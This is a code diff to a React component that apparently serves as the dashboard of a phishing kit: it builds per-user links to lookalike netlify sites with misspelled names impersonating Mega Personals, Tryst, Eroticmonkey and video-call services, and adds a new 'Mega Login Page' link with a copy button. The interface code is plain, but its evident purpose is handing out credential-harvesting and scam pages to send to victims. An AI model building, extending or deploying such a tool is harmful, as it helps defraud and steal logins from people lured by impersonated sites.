@@ -9,6 +9,7 @@ const Links = () => {
     megaDuo: false,
     megaWhatsApp: false,
     megaFaceTime: false,
+    megaLogin: false,
     tryst: false,
     eroticMonkey: false,
     adultsearch: false,
@@ -23,6 +24,8 @@ const Links = () => {
   const linkMegaDuo = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/duo`
   const linkMegaWhatsApp = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/whatsapp`
   const linkMegaFaceTime = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/facetime`
+
+  const linkMegaLogin = `https://megaqerrsonals.netlify.app/${userData?.email?.split('@')[0]}`
 
   const linkTrystLink = `https://supprt-trust.netlify.app/${userData?.email?.split('@')[0]}`
   const linkEroticMonkey = `https://supprt-erticmonkey.netlify.app/${userData?.email?.split('@')[0]}`
@@ -71,7 +74,33 @@ const Links = () => {
 
 
           <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Mega-Duo</h2>
+            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Mega Login Page</h2>
+            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
+              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
+                {linkMegaLogin}
+              </p>
+              <button
+                onClick={() => handleCopy(linkMegaLogin, 'megaLogin')}
+                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
+              >
+                {copied.megaLogin ? (
+                  <>
+                    <MdContentCopy className="text-lg mr-2" />
+                    Copied!
+                  </>
+                ) : (
+                  <>
+                    <FaClipboard className="text-lg mr-2" />
+                    Copy Link
+                  </>
+                )}
+              </button>
+            </div>
+          </div>
+
+
+          <div className=' flex flex-col w-full gap-2'>
+            <h2 className=' text-stone-700 font-semibold sm:text-xl'>2. Mega-Duo</h2>
             <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
               <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                 {linkMegaDuo}
@@ -96,7 +125,7 @@ const Links = () => {
           </div>
 
           <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>2. Mega-WhatsApp</h2>
+            <h2 className=' text-stone-700 font-semibold sm:text-xl'>3. Mega-WhatsApp</h2>
             <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
               <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                 {linkMegaWhatsApp}
@@ -121,7 +150,7 @@ const Links = () => {
           </div>
 
           <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>3. Mega-Facetime</h2>
+            <h2 className=' text-stone-700 font-semibold sm:text-xl'>4. Mega-Facetime</h2>
             <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
               <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
                 {linkMegaFaceTime}
